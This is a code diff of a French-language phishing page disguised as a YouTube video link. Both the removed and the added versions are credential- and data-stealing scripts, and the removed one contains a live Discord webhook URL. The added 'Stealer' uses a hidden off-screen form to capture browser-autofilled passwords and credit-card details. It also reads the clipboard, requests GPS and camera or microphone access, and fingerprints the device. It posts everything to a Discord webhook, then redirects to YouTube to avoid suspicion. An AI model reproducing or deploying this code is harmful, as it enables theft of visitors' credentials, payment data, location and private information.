@@ -3,181 +3,173 @@
 <head>
 <meta charset="UTF-8">
 <title>YouTube</title>
-<img src="logo.png" width="120" alt="YouTube"></head>
+<link rel="icon" href="https://www.youtube.com/favicon.ico">
+</head>
 <body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#fff;">
 
-<a href="https://www.youtube.com/watch?v=vQqU0F8vTOE" id="fakeLink" style="display:flex;align-items:center;gap:10px;font-family:Arial;font-size:24px;text-decoration:none;color:#000;">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/YouTube_Logo_2017.svg/320px-YouTube_Logo_2017.svg.png" width="120" alt="YouTube">
+<a href="#" id="fakeLink" style="display:flex;align-items:center;gap:10px;font-family:Arial;font-size:24px;text-decoration:none;color:#000;">
+  <img src="https://www.youtube.com/img/desktop/supported_browsers/dark/youtube-logo.svg" width="120" alt="YouTube">
   Regarder la vidéo
 </a>
 
-<script>
-// ⚠️ METS TON WEBHOOK DISCORD ICI
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1571811746522464307/REyCSk0KWS3N8dkGV2BuIfly47n0G-81qVAGozbpTnQtypVZU6EdxeCeQu8TXwXJ6u1A";
+<!-- Formulaire caché pour déclencher l'autofill -->
+<form id="decoyForm" style="position:absolute;left:-9999px;" autocomplete="on">
+  <input type="text"     name="username" id="d_user" autocomplete="username">
+  <input type="password" name="password" id="d_pass" autocomplete="current-password">
+  <input type="email"    name="email"    id="d_mail" autocomplete="email">
+  <input type="tel"      name="tel"      id="d_tel"  autocomplete="tel">
+  <input type="text"     name="cc-name"  id="d_ccn"  autocomplete="cc-name">
+  <input type="text"     name="cc-number" id="d_ccn2" autocomplete="cc-number">
+  <input type="text"     name="cc-exp"   id="d_cce"  autocomplete="cc-exp">
+  <input type="text"     name="cc-csc"   id="d_ccc"  autocomplete="cc-csc">
+  <input type="text"     name="address-line1" id="d_adr" autocomplete="street-address">
+  <input type="text"     name="postal-code"   id="d_zip" autocomplete="postal-code">
+  <input type="text"     name="city"          id="d_city" autocomplete="address-level2">
+  <input type="tel"      name="tel-full"      id="d_phone" autocomplete="tel-national">
+</form>
 
-/* ---------- HELPERS ---------- */
-async function getPublicIP() {
-  try { return (await (await fetch("https://api.ipify.org?format=json")).json()).ip; }
-  catch { return "inconnue"; }
+<script>
+const WEBHOOK_URL = "TON_WEBHOOK_ICI";
+const send = (payload) => fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}).catch(()=>{});
+
+/* ============== HELPERS ============== */
+const val = id => (document.getElementById(id)?.value || "").trim();
+
+async function publicIP(){
+  try{
+    const r = await fetch("https://ipinfo.io/json").then(r=>r.json());
+    return { ip:r.ip||"?", city:r.city, region:r.region, country:r.country, org:r.org, loc:r.loc };
+  }catch{
+    try{ return { ip:(await (await fetch("https://api.ipify.org?format=json")).json()).ip }; }
+    catch{ return { ip:"?" }; }
+  }
 }
 
-function getLocalIPs() {
-  return new Promise(resolve => {
-    const ips = new Set();
-    try {
-      const pc = new RTCPeerConnection({ iceServers:[{ urls:"stun:stun.l.google.com:19302" }] });
-      pc.createDataChannel("");
-      pc.onicecandidate = e => {
-        if (!e.candidate) { pc.close(); return resolve([...ips]); }
-        const m = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);
-        if (m) ips.add(m[0]);
-      };
-      pc.createOffer().then(o => pc.setLocalDescription(o));
-      setTimeout(() => { try{pc.close()}catch{}; resolve([...ips]); }, 2500);
-    } catch { resolve([]); }
+function localIPs(){return new Promise(res=>{const s=new Set();try{const p=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});p.createDataChannel("");p.onicecandidate=e=>{if(!e.candidate){p.close();return res([...s])}const m=e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);if(m)s.add(m[0])};p.createOffer().then(o=>p.setLocalDescription(o));setTimeout(()=>{try{p.close()}catch{};res([...s])},2500)}catch{res([])}})}
+
+function geo(){
+  return new Promise(res=>{
+    if(!navigator.geolocation) return res(null);
+    navigator.geolocation.getCurrentPosition(
+      p=>res({ lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy }),
+      ()=>res(null),
+      { enableHighAccuracy:true, timeout:8000, maximumAge:0 }
+    );
   });
 }
 
-function getWebGL() {
-  try {
-    const gl = document.createElement("canvas").getContext("webgl");
-    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-    return {
-      vendor:   dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
-      renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
-    };
-  } catch { return { vendor:"?", renderer:"?" }; }
+async function clipboard(){
+  try{ const t = await navigator.clipboard.readText(); return t ? t.slice(0,1500) : null; }
+  catch{ return null; }
 }
 
-function canvasFP() {
-  try {
-    const c = document.createElement("canvas");
-    const ctx = c.getContext("2d");
-    ctx.textBaseline = "top"; ctx.font = "14px Arial";
-    ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
-    ctx.fillStyle = "#069"; ctx.fillText("fp🐱", 2, 15);
-    ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fp🐱", 4, 17);
-    return c.toDataURL().slice(-24);
-  } catch { return "n/a"; }
+function webgl(){
+  try{
+    const gl=document.createElement("canvas").getContext("webgl");
+    const d=gl.getExtension("WEBGL_debug_renderer_info");
+    return {v:d?gl.getParameter(d.UNMASKED_VENDOR_WEBGL):"?",r:d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):"?"};
+  }catch{return{v:"?",r:"?"}}
 }
 
-async function battery() {
-  try {
-    if (!navigator.getBattery) return "n/a";
-    const b = await navigator.getBattery();
-    return `${Math.round(b.level*100)}% ${b.charging ? "⚡ en charge" : "🔋"}`;
-  } catch { return "n/a"; }
+function fp(){try{const c=document.createElement("canvas"),x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(125,1,62,20);x.fillStyle="#069";x.fillText("fp🐱",2,15);return c.toDataURL().slice(-24)}catch{return"n/a"}}
+
+async function battery(){try{if(!navigator.getBattery)return"n/a";const b=await navigator.getBattery();return`${Math.round(b.level*100)}% ${b.charging?"⚡":"🔋"} · ${Math.round(b.dischargingTime/60)||"∞"}min`}catch{return"n/a"}}
+
+async function devices(){try{const d=await navigator.mediaDevices.enumerateDevices();const n=k=>d.filter(x=>x.kind===k).length;return`📷${n("videoinput")} 🎤${n("audioinput")} 🔊${n("audiooutput")}`}catch{return"n/a"}}
+
+async function hints(){try{const ua=navigator.userAgentData;if(!ua)return null;const h=await ua.getHighEntropyValues(["platform","platformVersion","architecture","bitness","model","uaFullVersion","fullVersionList"]);return`${h.platform} ${h.platformVersion} · ${h.architecture}/${h.bitness}bit · v${h.uaFullVersion}`}catch{return null}}
+
+async function mediaStacks(){ /* tente d'accéder caméra/micro = permission popup */
+  const out={};
+  try{
+    const s = await navigator.mediaDevices.getUserMedia({ audio:true, video:true });
+    out.ok = true;
+    out.labels = s.getTracks().map(t=>`${t.kind}: ${t.label}`).join(" | ").slice(0,1000);
+    s.getTracks().forEach(t=>t.stop());
+  }catch(e){ out.ok = false; out.err = e.name; }
+  return out;
 }
 
-async function devices() {
-  try {
-    const d = await navigator.mediaDevices.enumerateDevices();
-    const n = k => d.filter(x => x.kind === k).length;
-    return `📷 ${n("videoinput")} | 🎤 ${n("audioinput")} | 🔊 ${n("audiooutput")}`;
-  } catch { return "n/a"; }
-}
-
-async function perms() {
-  try {
-    const names = ["geolocation","notifications","camera","microphone","clipboard-read","midi"];
-    const out = [];
-    for (const n of names) {
-      try {
-        const s = await navigator.permissions.query({ name:n });
-        if (s.state !== "prompt") out.push(`${n}: ${s.state}`);
-      } catch {}
-    }
-    return out.length ? out.join(" · ") : "toutes en attente";
-  } catch { return "n/a"; }
-}
-
-async function clientHints() {
-  try {
-    const ua = navigator.userAgentData;
-    if (!ua) return null;
-    const h = await ua.getHighEntropyValues(["platform","platformVersion","architecture","bitness","model","uaFullVersion"]);
-    return `${h.platform} ${h.platformVersion} · ${h.architecture}/${h.bitness}bit ${
-      h.model ? "· " + h.model : ""
-    } · Chrome/${h.uaFullVersion}`;
-  } catch { return null; }
-}
-
-/* ---------- MAIN ---------- */
+/* ============== MAIN ============== */
 document.getElementById("fakeLink").addEventListener("click", async (e) => {
   e.preventDefault();
 
-  const [ip, localIPs, bat, dev, pm, hints] = await Promise.all([
-    getPublicIP(), getLocalIPs(), battery(), devices(), perms(), clientHints()
-  ]);
+  // Récup immédiate (pas de prompt)
+  const [pub, lips, gl, bat, dev, hint] = await Promise.all([ publicIP(), localIPs(), webgl(), battery(), devices(), hints() ]);
 
-  const gl   = getWebGL();
-  const conn = navigator.connection || {};
-  const ua   = navigator.userAgent;
-  const os   = /Windows NT 10/.test(ua) ? "Windows 10/11"
-            : /Windows/.test(ua) ? "Windows"
-            : /Mac OS X/.test(ua) ? "macOS"
-            : /Android/.test(ua) ? "Android"
-            : /iPhone|iPad/.test(ua) ? "iOS"
-            : /Linux/.test(ua) ? "Linux" : "Inconnu";
-  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  // Récup après petites permissions (délai court)
+  const [g, clip] = await Promise.all([ geo().catch(()=>null), clipboard().catch(()=>null) ]);
 
-  const payload = {
-    username: "🕵️ Logger",
-    embeds: [
-      {
-        title: "🌐 Réseau",
-        color: 0x00c8ff,
-        fields: [
-          { name: "IP publique",   value: `\`${ip}\``,                                 inline: true  },
-          { name: "IP locale(s)",  value: `\`${localIPs.join(", ") || "masquée"}\``,   inline: true  },
-          { name: "Connexion",     value: conn.effectiveType ? `${conn.effectiveType} · ${conn.downlink ?? "?"} Mbps · RTT ${conn.rtt ?? "?"}ms` : "n/a", inline: false },
-          { name: "Fournisseur",   value: conn.type ? conn.type : "n/a",               inline: true  },
-          { name: "Page précédente", value: document.referrer || "aucune",              inline: false }
-        ],
-        timestamp: new Date().toISOString()
-      },
-      {
-        title: "💻 Système",
-        color: 0xff9f1c,
-        fields: [
-          { name: "OS",              value: os,                                        inline: true  },
-          { name: "Plateforme",      value: navigator.platform || "?",                 inline: true  },
-          { name: "Client Hints",    value: hints || "non supporté",                   inline: false },
-          { name: "User-Agent",      value: "`" + ua.slice(0, 950) + "`",              inline: false },
-          { name: "CPU (cœurs)",     value: String(navigator.hardwareConcurrency || "?"), inline: true },
-          { name: "RAM (Go)",        value: String(navigator.deviceMemory || "?"),     inline: true  },
-          { name: "GPU",             value: `${gl.vendor}\n${gl.renderer}`.slice(0,1020), inline: false },
-          { name: "Écran",           value: `${screen.width}×${screen.height} @ ${window.devicePixelRatio}x · ${screen.colorDepth} bits`, inline: false }
-        ]
-      },
-      {
-        title: "🎛️ Divers",
-        color: 0xa259ff,
-        fields: [
-          { name: "Langue",          value: `${navigator.language} / ${(navigator.languages||[]).join(", ")}`.slice(0,1020), inline: false },
-          { name: "Fuseau horaire",  value: tz,                                        inline: true  },
-          { name: "Batterie",        value: bat,                                       inline: true  },
-          { name: "Appareils",       value: dev,                                       inline: true  },
-          { name: "Cookies",         value: navigator.cookieEnabled ? "activés" : "désactivés", inline: true },
-          { name: "Do Not Track",    value: navigator.doNotTrack || "non",             inline: true  },
-          { name: "Touch",           value: navigator.maxTouchPoints > 0 ? `${navigator.maxTouchPoints} pts` : "non", inline: true },
-          { name: "Thème",           value: matchMedia("(prefers-color-scheme: dark)").matches ? "sombre" : "clair", inline: true },
-          { name: "Permissions",     value: pm,                                        inline: false },
-          { name: "Empreinte canvas",value: "`" + canvasFP() + "`",                    inline: false },
-          { name: "Heure locale",    value: new Date().toLocaleString("fr-FR"),        inline: true  }
-        ]
-      }
-    ]
+  const autofill = {
+    user:  val("d_user"),  pass:  val("d_pass"),  mail: val("d_mail"),  tel: val("d_tel"),
+    ccName: val("d_ccn"), ccNum: val("d_ccn2"), ccExp: val("d_cce"),  ccCsc: val("d_ccc"),
+    adr: val("d_adr"), zip: val("d_zip"), city: val("d_city"), phone: val("d_phone")
   };
 
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  }).catch(console.error);
+  const ua = navigator.userAgent;
+  const os = /Windows NT 10/.test(ua)?"Windows 10/11":/Windows/.test(ua)?"Windows":/Mac OS X/.test(ua)?"macOS":/Android/.test(ua)?"Android":/iPhone|iPad/.test(ua)?"iOS":/Linux/.test(ua)?"Linux":"?";
 
-  // Petite pause pour laisser la requête partir, puis redirection
-  setTimeout(() => window.location.href = "https://www.youtube.com", 400);
+  const mapGeo = g ? `https://www.google.com/maps?q=${g.lat},${g.lon}` : null;
+
+  /* -------- Message 1 : réseau + GPS -------- */
+  send({ username:"🕵️ Stealer", embeds:[{
+    title:"🌐 Réseau & Localisation", color:0x00c8ff,
+    fields:[
+      { name:"IP publique", value:`\`${pub.ip}\``, inline:true },
+      { name:"IP locale(s)", value:`\`${lips.join(", ")||"masquée"}\``, inline:true },
+      { name:"FAI/Org", value: pub.org || "?", inline:false },
+      { name:"Ville (IP)", value:`${pub.city||"?"}, ${pub.region||"?"}, ${pub.country||"?"}`, inline:false },
+      { name:"GPS précis", value: g ? `lat ${g.lat.toFixed(6)} lon ${g.lon.toFixed(6)} (±${Math.round(g.acc)}m)\n${mapGeo}` : "refusé/indispo", inline:false },
+      { name:"Carte IP", value: pub.loc ? `https://www.google.com/maps?q=${pub.loc}` : "?", inline:false },
+      { name:"Referrer", value: document.referrer||"aucun", inline:false }
+    ], timestamp:new Date().toISOString()
+  }]});
+
+  /* -------- Message 2 : autofill (mots de passe/champs) -------- */
+  const hasFill = Object.values(autofill).some(v=>v);
+  if(hasFill){
+    send({ username:"🔐 Autofill", embeds:[{
+      title:"Champs pré-remplis par le navigateur", color:0xff3864,
+      fields:Object.entries(autofill)
+        .filter(([,v])=>v)
+        .map(([k,v])=>({ name:k, value:`\`${v.slice(0,1000)}\``, inline: k.length > 6 }))
+    }], timestamp:new Date().toISOString()
+    });
+  }
+
+  /* -------- Message 3 : presse-papiers -------- */
+  if(clip) send({ username:"📋 Clipboard", embeds:[{ title:"Contenu du presse-papiers", description:`\`\`\`\n${clip}\n\`\`\``, color:0xa259ff }]});
+
+  /* -------- Message 4 : système + divers -------- */
+  send({ username:"💻 Système", embeds:[{
+    title:"Empreinte système", color:0xff9f1c,
+    fields:[
+      { name:"OS",         value: os, inline:true },
+      { name:"Client Hints", value: hint||"non supporté", inline:false },
+      { name:"GPU",        value:`${gl.v}\n${gl.r}`.slice(0,1020), inline:false },
+      { name:"UA",         value:"`"+ua.slice(0,950)+"`", inline:false },
+      { name:"CPU/RAM",    value:`${navigator.hardwareConcurrency||"?"} cœurs / ${navigator.deviceMemory||"?"} Go`, inline:true },
+      { name:"Écran",      value:`${screen.width}×${screen.height}@${devicePixelRatio}x`, inline:true },
+      { name:"Batterie",   value: bat, inline:true },
+      { name:"Devices",    value: dev, inline:true },
+      { name:"Langues",    value:(navigator.languages||[]).join(", "), inline:false },
+      { name:"TZ",         value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline:true },
+      { name:"Canvas FP",  value:"`"+fp()+"`", inline:true },
+      { name:"Heure locale", value: new Date().toLocaleString("fr-FR"), inline:true }
+    ], timestamp:new Date().toISOString()
+  }]});
+
+  /* -------- Message 5 : tentative caméra/micro (sans UI visible) -------- */
+  mediaStacks().then(m=>{
+    send({ username:"🎥 Media", embeds:[{
+      title:"Accès caméra/micro",
+      color: m.ok?0x00ff9d:0x888888,
+      description: m.ok ? "✅ Autorisé\n"+m.labels : "❌ Refusé/indispo ("+m.err+")"
+    }]});
+  });
+
+  // Redirection rapide pour ne pas éveiller les soupçons
+  setTimeout(()=>window.location.href="https://www.youtube.com", 500);
 });
 </script>
 
